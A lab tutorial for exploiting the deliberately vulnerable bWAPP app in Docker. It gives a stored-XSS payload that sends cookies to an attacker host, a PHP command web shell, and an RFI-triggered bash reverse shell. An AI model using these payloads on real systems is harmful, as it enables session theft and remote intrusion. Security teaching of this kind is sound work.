# bWAPP Exploitation Guide

This repository provides a comprehensive guide on exploiting bWAPP for learning purposes. It covers two key vulnerabilities: **Stored Cross-Site Scripting (XSS)** for session hijacking and **Remote File Inclusion (RFI)** for reverse shell access. **bWAPP** (Buggy Web Application) is an intentionally vulnerable web application designed for security testing and education.

> **Disclaimer:** This guide is for educational purposes only. Unauthorized testing or exploitation is illegal.

---

## Table of Contents

1. [Introduction](#introduction)
2. [Setup the Environment](#setup-the-environment)
3. [Stored XSS for Session Hijacking](#stored-xss-for-session-hijacking)
4. [Remote File Inclusion (RFI) Exploitation](#remote-file-inclusion-rfi-exploitation)
5. [Disclaimer](#disclaimer)

---

## Introduction

This tutorial uses bWAPP running inside a Docker container. The attacks demonstrate the following:

- **Stored XSS for session hijacking**: Exploit an XSS vulnerability to steal session cookies and impersonate users.
- **RFI for reverse shell**: Use a Remote File Inclusion vulnerability to execute a reverse shell.

---

## Setup the Environment

### 1. Install Docker
Ensure Docker is installed. Follow the [Docker installation guide](https://docs.docker.com/get-docker/) for your operating system.

### 2. Pull the bWAPP Docker Image
Run the following command to download the bWAPP image:
```bash
docker pull raesene/bwapp
```

### 3. Start the bWAPP Container
Launch the container:
```bash
docker run -d -p 8000:80 --name bwapp raesene/bwapp
```
Verify it is running:
```bash
docker ps
```

Access bWAPP in your browser: [http://localhost:8000](http://localhost:8000)

---

## Stored XSS for Session Hijacking

### 1. Access bWAPP
Login with default credentials:
- Username: `bee`
- Password: `bug`

### 2. Create a Victim Account
Navigate to the **Create User** section and register a new user:
- Username: `aaa`
- Password: `aaa`

### 3. Exploit Stored XSS

1. Log in as `aaa`.
2. Navigate to a page vulnerable to Stored XSS (e.g., [http://localhost:8000/xss_stored.php](http://localhost:8000/xss_stored.php)).
3. Inject the following payload into a comment field:
   ```html
   <script>document.location='http://<ATTACKER_IP>:9999/steal?cookie='+document.cookie;</script>
   ```
   Replace `<ATTACKER_IP>` with your machine’s IP.

### 4. Capture Stolen Cookies

1. Create a listener to capture cookies:
   ```bash
   mkdir xss_listener
   cd xss_listener
   python -m http.server 9999
   ```
2. Wait for the victim (e.g., admin user `bee`) to visit the infected page.
3. Extract the session cookie from your listener logs.

### 5. Hijack the Session
Edit your browser’s session cookie (using developer tools) to impersonate the victim.

---

## Remote File Inclusion (RFI) Exploitation

### 1. Enable RFI in PHP
Enter the Docker container:
```bash
docker exec -it bwapp /bin/bash
```
Edit the PHP configuration file:
```bash
vi /etc/php/7.0/apache2/php.ini
```
Modify these settings:
```ini
allow_url_include = On
allow_url_fopen = On
```
Restart Apache:
```bash
service apache2 restart
```

### 2. Host the Malicious PHP Script
On your attacker machine, create and host a malicious script:
```bash
echo "<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } else { echo 'RFI Proof of Concept'; } ?>" > evil.php
python -m http.server 9999
```

### 3. Test the RFI Vulnerability
Visit the vulnerable page:
```http
http://localhost:8000/rlfi.php
```
Inject the malicious URL:
```http
http://localhost:8000/rlfi.php?language=http://<ATTACKER_IP>:9999/evil.php&cmd=whoami
```
Replace `<ATTACKER_IP>` with your machine’s IP.

### 4. Start a Reverse Shell Listener
On your attacker machine:
```bash
nc -lvp 4444
```

### 5. Trigger the Reverse Shell
Use the following payload:
```http
http://localhost:8000/rlfi.php?language=http://<ATTACKER_IP>:9999/evil.php&cmd=/bin/bash%20-c%20"bash%20-i%20>%20/dev/tcp/<ATTACKER_IP>/4444%200>%261"
```
Replace `<ATTACKER_IP>` with your machine’s IP.

---

## Disclaimer

This guide is intended for **educational purposes only**. Unauthorized exploitation of systems is illegal and unethical. Always obtain proper authorization before performing any security testing.

